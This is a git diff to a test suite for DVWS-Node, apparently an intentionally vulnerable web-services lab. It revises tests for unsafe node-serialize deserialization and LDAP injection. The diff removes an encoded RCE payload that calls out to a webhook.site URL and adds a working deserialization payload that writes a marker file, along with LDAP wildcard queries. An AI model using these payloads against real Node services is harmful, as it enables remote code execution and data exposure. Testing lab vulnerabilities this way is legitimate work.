@@ -5,6 +5,7 @@ const request = require("supertest")(`${baseUrl}/api/v2`);
 const requestV1 = require("supertest")(`${baseUrl}/api/v1`);
 const requestRoot = require("supertest")(baseUrl);
 const expect = require("chai").expect;
+const fs = require('fs');
 
 describe("DVWS-Node Vulnerability Tests", function () {
   let authToken;
@@ -252,17 +253,26 @@ describe("DVWS-Node Vulnerability Tests", function () {
 
   describe("18. Unsafe Deserialization", function () {
     it("should use unsafe node-serialize deserialization", async function () {
-      const payload = "eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnaHR0cHMnKS5nZXQoJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzU0NjUyNjM3LTY0NDctNDI0OS05YjE3LWIyOGQ2MzljOGRhOScpO30oKSJ9";
-      const response = await request
-        .post("/export")
-        .set('Authorization', 'Bearer ' + authToken)
-        .send({ 
-            data: payload,
+      const markerPath = `/tmp/dvws-node-unsafe-deserialization-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
+      const serializedPayload = JSON.stringify({
+        rce: `_$$ND_FUNC$$_function () { require('fs').writeFileSync('${markerPath}', 'executed'); }()`
+      });
+      try {
+        const response = await request
+          .post("/export")
+          .set('Authorization', 'Bearer ' + authToken)
+          .send({
+            data: Buffer.from(serializedPayload).toString('base64'),
             password: "vulntest",
             username: "vulntest"
-        });
+          });
 
-      expect([200, 500]).to.include(response.status);
+        expect(response.status).to.eql(200);
+        expect(response.headers['content-type']).to.include('application/pdf');
+        expect(fs.readFileSync(markerPath, 'utf8')).to.eql('executed');
+      } finally {
+        if (fs.existsSync(markerPath)) fs.unlinkSync(markerPath);
+      }
     });
   });
 
@@ -475,7 +485,7 @@ describe("DVWS-Node Vulnerability Tests", function () {
         .query({ user: "*" });
         
       expect(wildcardResponse.status).to.eql(200);
-      expect(wildcardResponse.body.results).to.include("guest");
+      expect(wildcardResponse.body.results.map((account) => account.username)).to.include("test");
       
       const attrResponse = await request
         .get("/users/ldap-search")
@@ -483,7 +493,8 @@ describe("DVWS-Node Vulnerability Tests", function () {
         
       expect(attrResponse.status).to.eql(200);
       const adminUser = attrResponse.body.results[0];
-      expect(adminUser).to.have.property('password', 'letmein');
+      expect(adminUser).to.have.property('username', 'admin');
+      expect(adminUser.permissions).to.include('user:admin');
     });
   });
 
